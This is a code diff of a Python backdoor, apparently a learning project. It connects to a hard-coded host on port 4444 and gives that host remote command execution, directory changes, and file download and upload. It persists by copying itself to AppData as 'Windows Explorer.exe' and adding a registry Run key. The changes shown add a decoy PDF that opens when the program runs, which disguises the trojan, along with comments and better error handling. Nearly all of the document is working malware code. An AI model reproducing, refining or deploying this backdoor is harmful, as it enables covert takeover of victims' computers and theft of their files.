@@ -9,42 +9,43 @@ import shutil
 class Backdoor:
     def __init__(self, ip, port):
         self.become_persistent()
-        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #afnet - Address family internet , tcp
         self.connection.connect((ip, port))
 
     def reliable_send(self, data):
-        json_data = json.dumps(data.decode('utf-8') if isinstance(data, bytes) else data)
+        json_data = json.dumps(data.decode('utf-8') if isinstance(data, bytes) else data) # he send and convert the data into bytes to string 
         self.connection.send(json_data.encode('utf-8'))
 
     def become_persistent(self):
-        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
+        evil_file_location = os.path.join(os.environ["APPDATA"], "Windows Explorer.exe")
         if not os.path.exists(evil_file_location):
             shutil.copyfile(sys.executable, evil_file_location)
-            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v test /t REG_SZ /d "'+ evil_file_location + '"', shell=True)
+            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v test /t REG_SZ /d " ' + evil_file_location + '" ', shell=True)
 
     def reliable_receive(self):
-        json_data = ""
+        json_data = "" # Takes as an empty string as data
         while True:
             try:
-                json_data += self.connection.recv(1024).decode('utf-8')
+                json_data += self.connection.recv(1024).decode('utf-8')  #If data is 1024 it will directly implement otherwise it will be done in chunks format
                 return json.loads(json_data)
             except ValueError:
                 continue
 
     def execute_system_command(self, command):
         try:
-            return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
+            return subprocess.check_output(command, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         except subprocess.CalledProcessError as e:
             return str(e).encode('utf-8') 
 
     def change_working_directory_to(self, path):
         os.chdir(path)
-        return "[+] Changing working directory to " + path
+        return f"[+] Changing working directory to {path}"
 
     def read_file(self, path):
-        with open(path, "rb") as file:
-            return base64.b64encode(file.read()) 
-
+        if os.path.exists(path):
+            with open(path, "rb") as file:
+                return base64.b64encode(file.read()) 
+        return "[-] File not found.".encode('utf-8')
 
     def write_file(self, path, content):
         if isinstance(content, str):
@@ -52,7 +53,6 @@ class Backdoor:
         with open(path, "wb") as file:
             file.write(base64.b64decode(content))
             return "[+] Upload Successful"
-
 
     def run(self):
         while True:
@@ -69,15 +69,16 @@ class Backdoor:
                     command_result = self.write_file(command[1], command[2])
                 else:
                     command_result = self.execute_system_command(command)
-            except Exception :
-                command_result = "[-] Error During Command Execution."
+            except Exception as e:
+                command_result = f"[-] Error during command execution: {str(e)}"
             self.reliable_send(command_result)
 
-try :
+
+file_name = sys._MEIPASS + "\sample2.pdf"
+subprocess.Popen(file_name, shell=True)
+
+try:
     my_backdoor = Backdoor("192.168.88.128", 4444)
     my_backdoor.run()
-except Exception:
+except Exception as e:
     sys.exit()
-
-
-
